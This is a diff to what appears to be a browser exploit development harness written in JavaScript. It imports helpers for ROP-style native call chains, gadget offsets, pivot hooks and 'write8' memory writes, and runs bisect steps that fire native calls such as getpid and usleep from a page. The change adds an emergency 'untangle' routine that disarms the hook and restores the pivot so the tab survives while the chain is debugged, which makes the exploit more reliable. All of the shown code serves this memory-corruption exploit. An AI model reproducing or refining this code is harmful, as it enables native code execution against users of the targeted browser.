@@ -74,14 +74,15 @@ import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, firePivotSmoke,
     layoutSmokeStack, layoutGetpidStack, bisectArmG0, bisectHookPivot, bisectHookPivotPoops,
     bisectFireExpm1, bisectFirePoopsStyle, bisectPreflight, G0_HOOK_OFFS,
-    bisectRestore, bisectDisarmG0, fireNativeCallBisect, verifyFullChainSet, verifyBisectChainSet, describeSlabLayout,
+    bisectRestore, bisectDisarmG0, bisectEmergencyUntangle, bisectRestorePivotOnly,
+    fireNativeCallBisect, verifyFullChainSet, verifyBisectChainSet, describeSlabLayout,
     patchPrepG5, verifySlabAddrs, probePivotCell, bisectHookPivotAt, bisectHookPivotMulti,
     verifyPivotHookWrites,
     prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830as";
+const BUILD_ID = "rw-20250830at";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 smoke", title: "atomic layout+fire @ prep (chain_poops callAddr)" },
@@ -4134,6 +4135,8 @@ function ensureNativePrep(p, off) {
     });
     nativePrep.keepAlive.push(pivotObj);
     nativePrep._cap = { path, cell, jfn };
+    nativePrep._pinMainMf = mainMf;
+    nativePrep._pinMainOrig = mainOrig;
     mark("NATIVE-PREP", "mainMf " + path + " pivot="
         + (params.get("pivot") === "ta" ? "textarea" : "{}")
         + " cell=" + pivotCell + " G0code="
@@ -4289,8 +4292,7 @@ function bisectFlushBeforeFire() {
     try { crashLog.flushSync(); } catch (_) { }
 }
 
-function bisectHookVerifyLog(p, prep, hookOffs, tag) {
-    const hv = verifyPivotHookWrites(p, prep, hookOffs);
+function bisectHookVerifyLogFrom(hv, hookOffs, tag) {
     const detail = hv.rows.map(function (r) {
         return "+0x" + r.off.toString(16) + "=" + (r.ok ? "S" : (r.peek == null ? "null" : r.peek));
     }).join(" ");
@@ -4299,6 +4301,19 @@ function bisectHookVerifyLog(p, prep, hookOffs, tag) {
     if (!hv.ok)
         bisectLog("HOOK-FAIL", "write8 did not stick on any slot — run N4p peek, try ?pivot=ta");
     return hv;
+}
+
+function bisectHookVerifyLog(p, prep, hookOffs, tag) {
+    return bisectHookVerifyLogFrom(verifyPivotHookWrites(p, prep, hookOffs), hookOffs, tag);
+}
+
+function bisectPrepIsHot(prep) {
+    if (!prep) return false;
+    if (prep.mainArmed) return true;
+    const bis = prep._bisect;
+    if (bis && bis.multiSaved && bis.multiSaved.length) return true;
+    if (bis && bis.pivotSaved != null) return true;
+    return false;
 }
 
 function bisectLogHookPost(p, prep, hookOffs) {
@@ -4431,8 +4446,18 @@ function runNativeBisectStep(stepId) {
     const p = window.p;
     const off = loadEffectiveOff();
     busy = true;
+
+    /* renderOut/bisectLog before disarm OOMs if G0 armed + pivot poisoned */
+    let untangle = null;
+    if (nativePrep && (stepId === "disarm" || stepId === "restore"
+            || (bisectPrepIsHot(nativePrep) && stepId === "peek-pivot"))) {
+        try { untangle = bisectEmergencyUntangle(p, nativePrep); } catch (_) { }
+    }
+
     setUi();
-    bisectLog("BISECT", "step " + stepId + " build=" + BUILD_ID);
+    bisectLog("BISECT", "step " + stepId + " build=" + BUILD_ID
+        + (untangle ? " pre-untangle disarmed=" + untangle.disarmed
+            + " pivotRestored=" + untangle.restored : ""));
     let pid = -1;
     try {
         switch (stepId) {
@@ -4543,9 +4568,11 @@ function runNativeBisectStep(stepId) {
             requireNativePrep();
             bisectPrepSync(p, off, "pre-N4v");
             bisectHookPivotMulti(p, nativePrep, G0_HOOK_OFFS);
-            bisectHookVerifyLog(p, nativePrep, G0_HOOK_OFFS, "N4v");
+            const hv4v = verifyPivotHookWrites(p, nativePrep, G0_HOOK_OFFS);
+            bisectRestorePivotOnly(p, nativePrep);
+            bisectHookVerifyLogFrom(hv4v, G0_HOOK_OFFS, "N4v");
             bisectSnapshot(p, nativePrep, off, "post-N4v");
-            bisectLog("BISECT-OK", "N4v hook verified — NO G0 arm, NO expm1");
+            bisectLog("BISECT-OK", "N4v hook verified + pivot restored — tab clean");
             state("N4v hook OK", "ok");
             break;
         case "expm1-lite":
@@ -4599,20 +4626,19 @@ function runNativeBisectStep(stepId) {
         }
         case "disarm":
             requireNativePrep();
-            bisectFlushBeforeFire();
-            const wasArmed = bisectDisarmG0(p, nativePrep);
-            bisectLog("BISECT-OK", "N6d disarm mainMf→orig armed=" + wasArmed
+            if (!untangle)
+                untangle = bisectEmergencyUntangle(p, nativePrep);
+            bisectLog("BISECT-OK", "N6d emergency untangle disarmed=" + untangle.disarmed
+                + " pivotRestored=" + untangle.restored
                 + " orig=" + nativePrep.mainOrig);
             state("N6d disarm OK", "ok");
             break;
         case "restore":
             requireNativePrep();
-            bisectFlushBeforeFire();
-            bisectLog("BISECT-WARN", "N6 disarm-first then pivot restore…");
-            bisectDisarmG0(p, nativePrep);
-            bisectFlushBeforeFire();
-            bisectRestore(p, nativePrep);
-            bisectLog("BISECT-OK", "N6 restored pivotCell + mainMf");
+            if (!untangle)
+                untangle = bisectEmergencyUntangle(p, nativePrep);
+            bisectLog("BISECT-OK", "N6 restored disarmed=" + untangle.disarmed
+                + " pivotRestored=" + untangle.restored);
             state("N6 restore OK", "ok");
             break;
         case "smoke-full":
@@ -4660,9 +4686,9 @@ function runNativeBisectStep(stepId) {
             throw new Error("unknown step " + stepId);
         }
     } catch (err) {
+        try { if (nativePrep) bisectEmergencyUntangle(p, nativePrep); } catch (_) { }
         bisectLog("BISECT-FAIL", stepId + " " + (err.message || String(err)));
         state("bisect fail @ " + stepId, "bad");
-        try { if (nativePrep) bisectRestore(p, nativePrep); } catch (_) { }
     } finally {
         busy = false;
         setUi();
